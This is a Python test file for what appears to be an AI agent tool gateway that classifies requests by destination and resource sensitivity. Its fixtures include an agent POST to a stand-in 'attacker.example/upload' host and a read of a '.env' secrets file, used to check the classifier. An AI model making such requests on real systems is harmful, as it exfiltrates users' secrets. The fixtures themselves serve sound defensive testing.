from datetime import UTC, datetime

import pytest
from intentfence_contracts import ResourceClass, SourceContext

from intentfence_api.gateway.tools import CORE_TOOL_NAMES, normalize_tool_request


def test_core_registry_contains_exactly_five_protected_tools() -> None:
    assert CORE_TOOL_NAMES == (
        "browse_web",
        "read_file",
        "write_file",
        "send_message",
        "http_request",
    )


def test_normalize_http_request_extracts_destination_and_public_resource() -> None:
    normalized = normalize_tool_request(
        request_id="req-1",
        session_id="session-1",
        agent_id="agent-1",
        intent_id="intent-1",
        tool="http_request",
        arguments={"url": "https://attacker.example/upload", "method": "POST"},
        data_refs=["data-1"],
        source_context=SourceContext.EXTERNAL_WEB,
        timestamp=datetime(2026, 8, 22, tzinfo=UTC),
    )
    assert normalized.request.tool == "http_request"
    assert normalized.destination == "attacker.example"
    assert normalized.resource_class is ResourceClass.PUBLIC_WEB


def test_normalize_secret_file_classifies_without_reading_contents() -> None:
    normalized = normalize_tool_request(
        request_id="req-2",
        session_id="session-1",
        agent_id="agent-1",
        intent_id="intent-1",
        tool="read_file",
        arguments={"path": ".env"},
        source_context=SourceContext.EXTERNAL_WEB,
        timestamp=datetime(2026, 8, 22, tzinfo=UTC),
    )
    assert normalized.resource_class is ResourceClass.SECRET
    assert normalized.destination is None


def test_unknown_tool_is_rejected_before_authorization() -> None:
    with pytest.raises(ValueError, match="Unsupported protected tool"):
        normalize_tool_request(
            request_id="req-3",
            session_id="session-1",
            agent_id="agent-1",
            intent_id="intent-1",
            tool="run_shell",
            arguments={"command": "echo nope"},
            source_context=SourceContext.USER,
            timestamp=datetime(2026, 8, 22, tzinfo=UTC),
        )
